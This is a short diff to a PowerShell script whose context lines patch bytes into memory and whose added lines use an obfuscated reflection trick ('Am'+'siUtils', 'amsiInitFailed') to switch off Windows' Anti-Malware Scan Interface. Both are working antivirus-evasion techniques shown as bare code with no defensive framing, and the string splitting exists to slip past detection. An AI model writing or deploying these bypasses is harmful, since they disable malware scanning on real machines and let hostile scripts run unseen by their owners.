@@ -52,3 +52,8 @@ $nchj = "0x80"
 $yywa = "0xC3"
 $estof = [Byte[]] ($aapt,$qkwf,$snxi,$wnan,+$nchj,+$yywa)
 [System.Runtime.InteropServices.Marshal]::Copy($estof, 0, $iyslea, 6)
+
+==============================================================================================================================
+
+$teste = [Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils').GetField('am'+'siInitFailed','NonPublic,Static')
+$teste.SetValue($null,$true)
